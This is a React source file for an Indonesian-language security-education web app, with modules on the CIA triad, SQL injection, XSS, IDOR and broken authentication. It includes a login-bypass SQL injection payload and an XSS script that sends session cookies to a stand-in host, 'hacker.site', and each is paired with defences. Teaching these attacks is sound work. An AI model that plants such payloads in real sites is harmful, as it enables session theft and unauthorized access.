
import React, { useState } from 'react';
import Sidebar from './components/Sidebar';
import SQLVisualizer from './components/SQLVisualizer';
import AITutor from './components/AITutor';
import { SecurityCategory } from './types';
import { 
  Database, 
  ShieldAlert, 
  CheckCircle2, 
  Info, 
  ChevronRight, 
  PlayCircle, 
  Lock, 
  Zap, 
  AlertOctagon, 
  Cpu, 
  Users, 
  Wifi,
  Skull,
  Code,
  UserX,
  Key,
  ShieldCheck,
  Eye,
  FileCode,
  Search,
  Server,
  Terminal,
  Activity
} from 'lucide-react';

const App: React.FC = () => {
  const [activeCategory, setActiveCategory] = useState<SecurityCategory>(SecurityCategory.CYBER_BASICS);

  const renderContent = () => {
    switch (activeCategory) {
      case SecurityCategory.CYBER_BASICS:
        return (
          <div className="space-y-12 animate-in fade-in slide-in-from-top-4 duration-700">
            <header className="relative">
              <div className="absolute -left-4 top-0 w-1 h-20 bg-blue-600 rounded-full"></div>
              <h2 className="text-5xl font-black mb-4 tracking-tight">Cyber Security <span className="text-blue-500">Mastery</span></h2>
              <p className="text-slate-400 max-w-4xl text-xl leading-relaxed">
                Di era digital yang serba terhubung ini, data telah menjadi "mata uang" baru. Cyber Security bukan sekadar memasang antivirus, melainkan sebuah ekosistem pertahanan yang mencakup teknologi, proses, dan kesadaran manusia untuk melindungi integritas kehidupan digital kita.
              </p>
            </header>

            <section className="bg-slate-900/50 border border-slate-800 p-10 rounded-[2.5rem] shadow-2xl">
              <h3 className="text-3xl font-bold mb-10 flex items-center gap-4 text-white">
                <ShieldCheck className="w-8 h-8 text-blue-500" /> Filosofi CIA Triad
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-10">
                <div className="space-y-4">
                  <div className="w-14 h-14 bg-indigo-500/10 rounded-2xl flex items-center justify-center border border-indigo-500/20">
                    <Lock className="w-7 h-7 text-indigo-400" />
                  </div>
                  <h4 className="text-xl font-bold text-slate-100">Confidentiality</h4>
                  <p className="text-sm text-slate-400 leading-relaxed">
                    Menjamin bahwa informasi hanya dapat diakses oleh mereka yang memiliki hak legal. Bayangkan data medis Anda; jika bocor ke publik, maka prinsip kerahasiaan telah runtuh. Implementasi teknisnya meliputi enkripsi AES-256 dan kontrol akses berbasis peran (RBAC).
                  </p>
                </div>
                <div className="space-y-4">
                  <div className="w-14 h-14 bg-emerald-500/10 rounded-2xl flex items-center justify-center border border-emerald-500/20">
                    <CheckCircle2 className="w-7 h-7 text-emerald-400" />
                  </div>
                  <h4 className="text-xl font-bold text-slate-100">Integrity</h4>
                  <p className="text-sm text-slate-400 leading-relaxed">
                    Memastikan data tetap akurat, konsisten, dan tidak dimodifikasi oleh pihak yang tidak berwenang selama transit maupun penyimpanan. Contoh fatal: jika hacker mengubah angka di rekening bank Anda dari Rp10.000 menjadi Rp10.000.000, itu adalah pelanggaran integritas.
                  </p>
                </div>
                <div className="space-y-4">
                  <div className="w-14 h-14 bg-sky-500/10 rounded-2xl flex items-center justify-center border border-sky-500/20">
                    <Activity className="w-7 h-7 text-sky-400" />
                  </div>
                  <h4 className="text-xl font-bold text-slate-100">Availability</h4>
                  <p className="text-sm text-slate-400 leading-relaxed">
                    Sistem harus dapat diakses kapan saja dibutuhkan oleh pengguna sah. Serangan DDoS adalah musuh utama ketersediaan. Jika sebuah rumah sakit tidak bisa mengakses database pasien saat keadaan darurat karena sistem down, nyawa bisa terancam.
                  </p>
                </div>
              </div>
            </section>

            <section className="space-y-8">
              <h3 className="text-3xl font-bold flex items-center gap-3 text-red-500">
                <Skull className="w-8 h-8" /> Ekosistem Ancaman Siber
              </h3>
              <div className="grid grid-cols-1 gap-6">
                {[
                  {
                    name: 'Social Engineering (Phishing)',
                    desc: 'Ini adalah serangan terhadap "Human Firewall". Hacker tidak meretas mesin, melainkan meretas psikologi manusia. Mereka mengirimkan link palsu yang terlihat persis seperti halaman login Bank atau Media Sosial Anda. Begitu Anda memasukkan kredensial, hacker langsung mendapatkan akses penuh.',
                    detail: 'Tanda-tanda: URL sedikit berbeda (misal: faceb00k.com), bahasa yang mendesak, dan permintaan informasi sensitif yang tidak lazim.',
                    icon: Users,
                    color: 'from-orange-500/20 to-transparent'
                  },
                  {
                    name: 'Ransomware (Crypto-Extortion)',
                    desc: 'Salah satu serangan paling merusak saat ini. Malware ini masuk ke sistem, mengenkripsi seluruh file penting Anda dengan kunci yang hanya dimiliki hacker, lalu meminta tebusan dalam bentuk Bitcoin. Jika tidak dibayar, data akan dihancurkan atau dibocorkan ke publik.',
                    detail: 'Target utama: Perusahaan besar, rumah sakit, dan instansi pemerintah yang tidak bisa berfungsi tanpa data mereka.',
                    icon: Lock,
                    color: 'from-red-600/20 to-transparent'
                  }
                ].map((item, i) => (
                  <div key={i} className={`bg-slate-900 border border-slate-800 p-8 rounded-3xl bg-gradient-to-br ${item.color}`}>
                    <div className="flex items-start gap-6">
                      <div className="p-4 bg-slate-950 rounded-2xl border border-slate-800">
                        <item.icon className="w-8 h-8 text-slate-100" />
                      </div>
                      <div className="space-y-2">
                        <h4 className="text-2xl font-bold">{item.name}</h4>
                        <p className="text-slate-400 leading-relaxed">{item.desc}</p>
                        <p className="text-sm text-blue-500 font-semibold italic mt-2">{item.detail}</p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </section>
          </div>
        );

      case SecurityCategory.SQL_BASICS:
        return (
          <div className="space-y-12 animate-in fade-in duration-500">
            <header>
              <h2 className="text-4xl font-black mb-4">Bahasa Database: <span className="text-blue-500">SQL</span></h2>
              <p className="text-slate-400 max-w-3xl text-lg leading-relaxed">
                Sebelum memahami cara meretasnya, Anda harus paham cara kerjanya. SQL adalah jembatan antara aplikasi web dan database. Hampir setiap data yang Anda lihat di internet (postingan, profil, saldo) diambil menggunakan query SQL.
              </p>
            </header>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-slate-900 border border-slate-800 p-8 rounded-3xl space-y-6">
                <h3 className="text-2xl font-bold flex items-center gap-3"><Terminal className="w-6 h-6 text-blue-400" /> Struktur Query Dasar</h3>
                <div className="space-y-4">
                  <div className="bg-slate-950 p-4 rounded-xl border border-slate-800">
                    <code className="text-sm text-blue-400">SELECT * FROM users;</code>
                    <p className="text-xs text-slate-500 mt-2">Artinya: Ambil "Semua Kolom" dari tabel bernama "users".</p>
                  </div>
                  <div className="bg-slate-950 p-4 rounded-xl border border-slate-800">
                    <code className="text-sm text-blue-400">SELECT name FROM users WHERE id = 5;</code>
                    <p className="text-xs text-slate-500 mt-2">Artinya: Ambil hanya kolom "name" milik user yang memiliki "id" angka 5.</p>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-800 p-8 rounded-3xl space-y-4">
                <h3 className="text-2xl font-bold text-white">Kenapa Hacker Suka SQL?</h3>
                <p className="text-slate-400 leading-relaxed">
                  Database adalah "brankas" perusahaan. Di sanalah password, nomor kartu kredit, dan rahasia bisnis disimpan. Jika seorang hacker berhasil melakukan "Injeksi" ke dalam perintah SQL ini, mereka bisa memerintahkan database untuk memberikan semua isi brankas tersebut tanpa kunci.
                </p>
                <div className="flex items-center gap-2 text-blue-400 font-bold text-sm">
                  <Info className="w-4 h-4" /> Pelajari lebih lanjut di modul SQL Injection selanjutnya.
                </div>
              </div>
            </div>
          </div>
        );

      case SecurityCategory.SQL_INJECTION:
        return (
          <div className="space-y-12 animate-in slide-in-from-bottom-6 duration-700">
            <header>
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-red-500/10 border border-red-500/20 text-red-500 text-xs font-black uppercase tracking-widest mb-4">
                <AlertOctagon className="w-4 h-4" /> Critical Vulnerability
              </div>
              <h2 className="text-5xl font-black mb-4">SQL <span className="text-red-600">Injection</span></h2>
              <p className="text-slate-400 max-w-3xl text-xl leading-relaxed">
                Ini adalah teknik di mana penyerang memasukkan data input yang mengandung perintah SQL ke dalam form input aplikasi web, dengan tujuan untuk dieksekusi oleh database di server.
              </p>
            </header>

            <section className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] space-y-8">
              <h3 className="text-3xl font-bold">Bagaimana Ini Terjadi?</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                <div className="space-y-6">
                  <p className="text-slate-300 leading-relaxed">
                    Bayangkan sebuah form login. Aplikasi biasanya menjalankan query seperti ini:
                  </p>
                  <div className="bg-slate-950 p-4 rounded-xl border border-slate-800">
                    <code className="text-xs text-slate-500 uppercase block mb-2">Query Normal:</code>
                    <code className="text-sm text-blue-400">SELECT * FROM users WHERE user='admin' AND pass='password123';</code>
                  </div>
                  <p className="text-slate-300 leading-relaxed">
                    Hacker tidak akan memasukkan password asli. Mereka memasukkan <strong>Payload</strong>:
                  </p>
                  <div className="bg-slate-950 p-4 rounded-xl border border-red-900/30">
                    <code className="text-xs text-red-500 uppercase block mb-2">Input Berbahaya:</code>
                    <code className="text-sm text-red-400">' OR '1'='1</code>
                  </div>
                </div>
                <div className="bg-slate-950 p-8 rounded-2xl border border-slate-800 relative">
                  <h4 className="font-bold mb-4 text-white">Hasil Manipulasi Query:</h4>
                  <code className="text-sm text-slate-400 block leading-relaxed">
                    SELECT * FROM users WHERE user='admin' AND pass='<span className="text-red-500 font-bold underline">' OR '1'='1</span>';
                  </code>
                  <div className="mt-6 p-4 bg-blue-600/10 border border-blue-500/20 rounded-xl">
                    <p className="text-xs text-blue-300 italic">
                      "Karena '1'='1' selalu bernilai BENAR (TRUE), database akan mengabaikan password dan mengizinkan hacker masuk sebagai admin tanpa perlu tau password aslinya."
                    </p>
                  </div>
                </div>
              </div>
            </section>

            <section className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800">
                <h4 className="text-2xl font-bold mb-6 text-red-500">Dampak Masif:</h4>
                <ul className="space-y-4">
                  <li className="flex gap-4">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-500 mt-2 shrink-0"></div>
                    <div>
                      <span className="font-bold text-slate-100">Bypass Authentication:</span> Masuk ke akun manapun, termasuk administrator.
                    </div>
                  </li>
                  <li className="flex gap-4">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-500 mt-2 shrink-0"></div>
                    <div>
                      <span className="font-bold text-slate-100">Data Exfiltration:</span> Mencuri seluruh tabel database (user, credit card, rahasia bisnis).
                    </div>
                  </li>
                  <li className="flex gap-4">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-500 mt-2 shrink-0"></div>
                    <div>
                      <span className="font-bold text-slate-100">Database Destruction:</span> Menghapus seluruh isi database menggunakan perintah `DROP TABLE`.
                    </div>
                  </li>
                </ul>
              </div>
              <div className="bg-blue-600/5 border border-blue-600/20 p-8 rounded-3xl">
                <h4 className="text-2xl font-bold mb-4 text-blue-400">Cara Melindungi:</h4>
                <p className="text-slate-400 text-sm leading-relaxed mb-4">
                  Developer harus menggunakan <strong>Prepared Statements</strong> atau <strong>Parameterized Queries</strong>. Dengan teknik ini, database diberitahu mana yang "Perintah SQL" dan mana yang hanya "Data Input". Input hacker akan diperlakukan sebagai teks biasa, bukan bagian dari perintah yang harus dijalankan.
                </p>
                <div className="p-4 bg-slate-950 rounded-xl border border-slate-800">
                  <code className="text-xs text-green-400">
                    // Contoh yang aman di PHP:<br/>
                    $stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE user = ?');<br/>
                    $stmt-&gt;execute([$username]);
                  </code>
                </div>
              </div>
            </section>
          </div>
        );

      case SecurityCategory.XSS:
        return (
          <div className="space-y-12 animate-in fade-in slide-in-from-left-6 duration-700">
            <header>
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 text-xs font-black uppercase tracking-widest mb-4">
                <Code className="w-4 h-4" /> Client-Side Vulnerability
              </div>
              <h2 className="text-5xl font-black mb-4">Cross-Site <span className="text-indigo-500">Scripting</span></h2>
              <p className="text-slate-400 max-w-3xl text-xl leading-relaxed">
                Jika SQL Injection menyerang database (Server), maka XSS menyerang pengguna aplikasi tersebut (Client). Hacker menyisipkan kode JavaScript ke dalam website agar dijalankan di browser orang lain.
              </p>
            </header>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              {[
                { 
                  type: 'Stored (Persistent) XSS', 
                  desc: 'Jenis paling berbahaya. Skrip jahat disimpan secara permanen di database server (misal: di kolom komentar atau profil). Setiap orang yang membuka halaman tersebut akan otomatis menjalankan skrip hacker.', 
                  color: 'border-red-500/30 bg-red-500/5',
                  icon: Server
                },
                { 
                  type: 'Reflected (Non-Persistent) XSS', 
                  desc: 'Skrip jahat "dipantulkan" melalui parameter URL. Hacker mengirimkan link yang sudah dimodifikasi ke korban. Begitu link diklik, browser korban menjalankan skrip tersebut.', 
                  color: 'border-amber-500/30 bg-amber-500/5',
                  icon: Search
                },
                { 
                  type: 'DOM-based XSS', 
                  desc: 'Serangan terjadi sepenuhnya di sisi browser. Kode JavaScript aplikasi yang asli memiliki celah saat memproses data input, sehingga mengeksekusi skrip jahat tanpa melibatkan server.', 
                  color: 'border-blue-500/30 bg-blue-500/5',
                  icon: Cpu
                },
              ].map((x, i) => (
                <div key={i} className={`p-8 rounded-3xl border ${x.color} space-y-4 shadow-lg hover:scale-[1.02] transition-transform`}>
                  <x.icon className="w-8 h-8 opacity-70" />
                  <h4 className="text-xl font-bold text-white">{x.type}</h4>
                  <p className="text-sm text-slate-400 leading-relaxed">{x.desc}</p>
                </div>
              ))}
            </div>

            <section className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] relative overflow-hidden">
              <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-600/5 rounded-full -mr-32 -mt-32"></div>
              <h3 className="text-2xl font-bold mb-6 flex items-center gap-2 text-white">
                <FileCode className="w-6 h-6 text-indigo-500" /> Skenario: Pencurian Cookie
              </h3>
              <div className="space-y-6 text-slate-300">
                <p className="leading-relaxed">
                  Bayangkan hacker memasukkan komentar di blog Anda seperti ini:
                </p>
                <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800">
                  <code className="text-indigo-400 text-sm">
                    &lt;script&gt;<br/>
                    &nbsp;&nbsp;fetch('https://hacker.site/steal?cookie=' + document.cookie);<br/>
                    &lt;/script&gt;
                  </code>
                </div>
                <p className="leading-relaxed">
                  Begitu Admin membuka halaman komentar, browser Admin akan mengirimkan <strong>Session Cookie</strong> milik Admin ke server hacker secara diam-diam. Hacker kemudian menggunakan cookie tersebut untuk login sebagai Admin tanpa password!
                </p>
                <div className="pt-6 border-t border-slate-800">
                  <h4 className="font-bold text-indigo-400 mb-2">Cara Mengatasi:</h4>
                  <p className="text-sm text-slate-400">
                    Gunakan <strong>Output Encoding</strong>. Ubah karakter khusus seperti ` &lt; ` menjadi ` &amp;lt; ` agar browser tidak menganggapnya sebagai kode skrip. Gunakan juga header keamanan seperti <strong>Content Security Policy (CSP)</strong>.
                  </p>
                </div>
              </div>
            </section>
          </div>
        );

      case SecurityCategory.IDOR:
        return (
          <div className="space-y-12 animate-in fade-in duration-700">
            <header>
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-black uppercase tracking-widest mb-4">
                <UserX className="w-4 h-4" /> Broken Access Control
              </div>
              <h2 className="text-5xl font-black mb-4">I.D.O.R <span className="text-emerald-500">Analysis</span></h2>
              <p className="text-slate-400 max-w-3xl text-xl leading-relaxed">
                <strong>Insecure Direct Object Reference</strong> adalah celah di mana aplikasi membiarkan pengguna mengakses data sensitif milik orang lain hanya dengan mengganti "ID" atau "Nama File" di dalam permintaan (request).
              </p>
            </header>

            <div className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] space-y-8">
              <h3 className="text-2xl font-bold flex items-center gap-3"><Eye className="w-6 h-6 text-emerald-500" /> Skenario: Pencurian Faktur Belanja</h3>
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                <div className="space-y-6">
                  <div className="p-6 bg-slate-950 rounded-2xl border border-slate-800">
                    <p className="text-xs text-slate-500 mb-3 uppercase font-bold tracking-widest">URL Anda (User #55)</p>
                    <code className="text-sm text-slate-300 block bg-slate-900 p-2 rounded">site.com/view-invoice?id=<span className="text-emerald-400 font-black">55</span></code>
                    <p className="text-xs text-emerald-500/70 mt-3 font-medium">Status: Berhasil melihat invoice milik Anda.</p>
                  </div>
                  <div className="p-6 bg-slate-950 rounded-2xl border border-red-900/50">
                    <p className="text-xs text-red-500 mb-3 uppercase font-bold tracking-widest">URL Dimanipulasi Hacker</p>
                    <code className="text-sm text-slate-300 block bg-slate-900 p-2 rounded">site.com/view-invoice?id=<span className="text-red-500 font-black">54</span></code>
                    <p className="text-xs text-red-500 mt-3 font-medium animate-pulse">Status: Berhasil melihat invoice orang lain!</p>
                  </div>
                </div>
                <div className="space-y-6">
                  <h4 className="text-xl font-bold text-white">Kenapa ini sangat berbahaya?</h4>
                  <p className="text-slate-400 leading-relaxed text-sm">
                    IDOR seringkali disepelekan karena terlihat sangat sederhana. Namun, IDOR memungkinkan penyerang untuk melakukan <strong>Mass Data Scraping</strong>. Hacker bisa menggunakan program otomatis untuk mengubah ID dari 1 sampai 1.000.000 dan mengunduh seluruh data pengguna aplikasi tersebut dalam hitungan menit.
                  </p>
                  <div className="p-4 bg-emerald-600/10 border border-emerald-500/20 rounded-xl">
                    <p className="text-xs text-emerald-300 font-bold uppercase mb-1">Penyebab Utama:</p>
                    <p className="text-xs text-slate-400 italic">"Server percaya begitu saja pada ID yang dikirim browser tanpa mengecek: 'Apakah user yang login ini berhak melihat invoice #54?'"</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800 shadow-xl">
                <h4 className="text-xl font-bold mb-4 flex items-center gap-2"><Lock className="w-5 h-5 text-blue-500" /> Cara Pencegahan</h4>
                <ol className="space-y-3 text-sm text-slate-400">
                  <li><strong>1. Object-Level Authorization:</strong> Setiap kali ada request data, server harus mengecek kepemilikan data tersebut di database.</li>
                  <li><strong>2. Use Random IDs (UUID):</strong> Gunakan ID yang panjang dan acak (misal: `550e8400-e29b-41d4...`) daripada angka urut seperti 1, 2, 3 yang mudah ditebak.</li>
                  <li><strong>3. Indirect Reference Map:</strong> Gunakan ID sementara yang hanya berlaku untuk sesi user tersebut.</li>
                </ol>
              </div>
              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800 shadow-xl flex items-center justify-center text-center">
                <div>
                  <Users className="w-12 h-12 mx-auto mb-4 text-emerald-500/50" />
                  <p className="text-sm text-slate-500 italic">"IDOR adalah bukti bahwa keamanan bukan hanya soal enkripsi, tapi soal logika pengecekan hak akses."</p>
                </div>
              </div>
            </div>
          </div>
        );

      case SecurityCategory.AUTH_BROKEN:
        return (
          <div className="space-y-12 animate-in fade-in duration-700">
            <header>
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 text-xs font-black uppercase tracking-widest mb-4">
                <Key className="w-4 h-4" /> Identity & Access Failure
              </div>
              <h2 className="text-5xl font-black mb-4">Broken <span className="text-amber-500">Authentication</span></h2>
              <p className="text-slate-400 max-w-3xl text-xl leading-relaxed">
                Ini adalah kegagalan dalam mekanisme autentikasi dan manajemen sesi. Hacker memanfaatkan kelemahan ini untuk menyamar sebagai pengguna lain atau mencuri akun secara massal.
              </p>
            </header>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800 space-y-6 hover:border-amber-500/30 transition-all">
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-amber-500/10 rounded-xl text-amber-500"><Zap className="w-6 h-6" /></div>
                  <h4 className="text-2xl font-bold">Brute Force & Stuffing</h4>
                </div>
                <p className="text-sm text-slate-400 leading-relaxed">
                  Hacker menggunakan bot untuk mencoba jutaan kombinasi password sampai berhasil. <strong>Credential Stuffing</strong> lebih cerdas: hacker menggunakan daftar username/password yang bocor dari situs lain (misal: Tokopedia bocor, lalu hacker mencoba data yang sama di Instagram Anda).
                </p>
                <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-[10px] text-amber-500 font-bold uppercase">Ancaman: Sangat Tinggi bagi yang memakai password pasaran.</div>
              </div>

              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800 space-y-6 hover:border-blue-500/30 transition-all">
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-blue-500/10 rounded-xl text-blue-500"><Key className="w-6 h-6" /></div>
                  <h4 className="text-2xl font-bold">Session Hijacking</h4>
                </div>
                <p className="text-sm text-slate-400 leading-relaxed">
                  Setiap kali login, server memberi Anda "Session ID". Jika hacker berhasil mencuri ID ini (melalui XSS atau jaringan yang tidak aman), mereka bisa "membajak" akun Anda tanpa perlu tau password-nya. Anda akan langsung dikeluarkan (logged out) dan hacker mengambil kendali.
                </p>
                <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-[10px] text-blue-500 font-bold uppercase">Solusi: Gunakan HTTPS dan Cookie HttpOnly.</div>
              </div>
            </div>

            <section className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] space-y-6">
              <h3 className="text-2xl font-bold text-white flex items-center gap-3"><ShieldCheck className="w-6 h-6 text-emerald-500" /> Standar Keamanan Modern</h3>
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800">
                  <h5 className="font-bold mb-2 text-slate-200">MFA / 2FA</h5>
                  <p className="text-xs text-slate-500">Mewajibkan langkah kedua (kode SMS/Aplikasi Authenticator). Benteng terkuat melawan pencurian password.</p>
                </div>
                <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800">
                  <h5 className="font-bold mb-2 text-slate-200">Rate Limiting</h5>
                  <p className="text-xs text-slate-500">Membatasi jumlah percobaan login. Jika salah 5 kali, akun dikunci sementara. Menghalangi serangan bot.</p>
                </div>
                <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800">
                  <h5 className="font-bold mb-2 text-slate-200">Password Hashing</h5>
                  <p className="text-xs text-slate-500">Server tidak boleh menyimpan password asli. Harus diubah menjadi "Hash" menggunakan algoritma seperti Argon2 atau Bcrypt.</p>
                </div>
              </div>
            </section>
          </div>
        );

      case SecurityCategory.PREVENTION:
        return (
          <div className="space-y-8 animate-in fade-in duration-500">
            <header>
              <h2 className="text-4xl font-black mb-4">Defense <span className="text-emerald-500">Mastering</span></h2>
              <p className="text-slate-400 max-w-2xl text-lg leading-relaxed">
                Keamanan adalah sebuah perjalanan, bukan tujuan akhir. Berikut adalah kerangka kerja untuk membangun pertahanan yang tangguh.
              </p>
            </header>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800 space-y-4 hover:bg-slate-800/50 transition-colors">
                <div className="w-12 h-12 bg-emerald-500/10 rounded-xl flex items-center justify-center text-emerald-500 mb-2">
                  <ShieldCheck className="w-6 h-6" />
                </div>
                <h4 className="text-xl font-bold text-white">Security-First Development</h4>
                <p className="text-sm text-slate-400 leading-relaxed">
                  Keamanan harus dipikirkan sejak baris kode pertama ditulis. Lakukan <strong>Static Analysis (SAST)</strong> dan <strong>Dynamic Testing (DAST)</strong> secara rutin untuk menemukan celah sebelum hacker menemukannya.
                </p>
              </div>

              <div className="bg-slate-900 p-8 rounded-3xl border border-slate-800 space-y-4 hover:bg-slate-800/50 transition-colors">
                <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center text-blue-500 mb-2">
                  <Wifi className="w-6 h-6" />
                </div>
                <h4 className="text-xl font-bold text-white">Network Hardening</h4>
                <p className="text-sm text-slate-400 leading-relaxed">
                  Gunakan Firewall, Intrusion Detection Systems (IDS), dan matikan port server yang tidak digunakan. Pastikan semua komunikasi data menggunakan enkripsi TLS/SSL terbaru.
                </p>
              </div>
            </div>

            <div className="bg-gradient-to-br from-blue-600/20 to-indigo-600/20 p-10 rounded-[2.5rem] border border-blue-500/20">
               <div className="flex flex-col md:flex-row gap-10 items-center">
                 <div className="flex-1 space-y-4">
                   <h3 className="text-3xl font-bold text-white">Jadilah "Ethical Hacker"</h3>
                   <p className="text-slate-400 leading-relaxed">
                     Dunia membutuhkan lebih banyak "White Hat Hackers" — orang-orang yang menggunakan kemampuan mereka untuk melindungi, bukan merusak. Teruslah bereksperimen di Lab kami untuk melatih insting deteksi Anda.
                   </p>
                   <button onClick={() => setActiveCategory(SecurityCategory.LABS)} className="bg-blue-600 hover:bg-blue-500 px-8 py-4 rounded-xl font-black text-sm uppercase tracking-widest transition-all shadow-lg shadow-blue-900/40 flex items-center gap-2">
                     Buka Interactive Lab <Terminal className="w-4 h-4" />
                   </button>
                 </div>
                 <div className="w-48 h-48 bg-slate-950 rounded-full flex items-center justify-center border-4 border-slate-800 shadow-2xl shrink-0">
                    <ShieldCheck className="w-20 h-20 text-blue-500 opacity-50" />
                 </div>
               </div>
            </div>
          </div>
        );

      case SecurityCategory.LABS:
        return (
          <div className="space-y-8 animate-in slide-in-from-right-4 duration-500">
             <header>
              <h2 className="text-4xl font-black mb-2">Interactive <span className="text-blue-500">Lab</span></h2>
              <p className="text-slate-400 max-w-2xl text-lg">
                Uji teori yang telah Anda pelajari. Cobalah melakukan Injeksi pada simulator SQL di bawah ini.
              </p>
            </header>
            <SQLVisualizer />
          </div>
        );
      
      default:
        return null;
    }
  };

  return (
    <div className="flex min-h-screen bg-slate-950 text-slate-200 selection:bg-blue-500/30">
      <Sidebar activeCategory={activeCategory} onCategoryChange={setActiveCategory} />
      
      <main className="flex-1 p-6 md:p-12 lg:p-16 max-w-[1600px] mx-auto overflow-y-auto">
        <div className="flex flex-col xl:flex-row gap-16">
          <div className="flex-1">
            {renderContent()}
          </div>

          <div className="w-full xl:w-[450px] shrink-0 xl:sticky xl:top-12 self-start space-y-10">
            <AITutor />
            
            <div className="bg-slate-900 border border-slate-800 p-8 rounded-[2rem] shadow-2xl relative overflow-hidden group">
              <div className="absolute -right-4 -bottom-4 w-32 h-32 bg-blue-600/5 rounded-full group-hover:scale-150 transition-transform duration-700"></div>
              <h4 className="font-black text-xs uppercase tracking-[0.3em] mb-8 flex items-center gap-3 text-blue-500">
                <Zap className="w-5 h-5 fill-blue-500" /> Curriculum Progress
              </h4>
              <div className="space-y-6">
                {[
                  { label: 'Cyber Foundations', cat: SecurityCategory.CYBER_BASICS },
                  { label: 'SQL Architecture', cat: SecurityCategory.SQL_BASICS },
                  { label: 'Injection Vector', cat: SecurityCategory.SQL_INJECTION },
                  { label: 'Cross-Site Scripting', cat: SecurityCategory.XSS },
                  { label: 'Broken Access (IDOR)', cat: SecurityCategory.IDOR },
                  { label: 'Broken Authentication', cat: SecurityCategory.AUTH_BROKEN },
                  { label: 'Defense Strategies', cat: SecurityCategory.PREVENTION }
                ].map((step, i) => {
                  const isActive = activeCategory === step.cat;
                  return (
                    <div key={i} className="flex items-center gap-5 group cursor-pointer" onClick={() => setActiveCategory(step.cat)}>
                      <div className={`w-10 h-10 rounded-2xl flex items-center justify-center text-xs font-black transition-all border ${isActive ? 'bg-blue-600 text-white border-blue-400 scale-110 shadow-xl shadow-blue-900/40' : 'bg-slate-800 text-slate-500 border-slate-700 group-hover:bg-slate-700'}`}>
                        {i + 1}
                      </div>
                      <div className="flex-1">
                        <span className={`text-[13px] font-black transition-colors block ${isActive ? 'text-slate-100' : 'text-slate-600 group-hover:text-slate-400'}`}>
                          {step.label}
                        </span>
                        {isActive && <span className="text-[10px] text-blue-500 font-bold uppercase tracking-widest animate-pulse">Sedang Dipelajari</span>}
                      </div>
                      {isActive && <ChevronRight className="w-4 h-4 text-blue-500" />}
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default App;
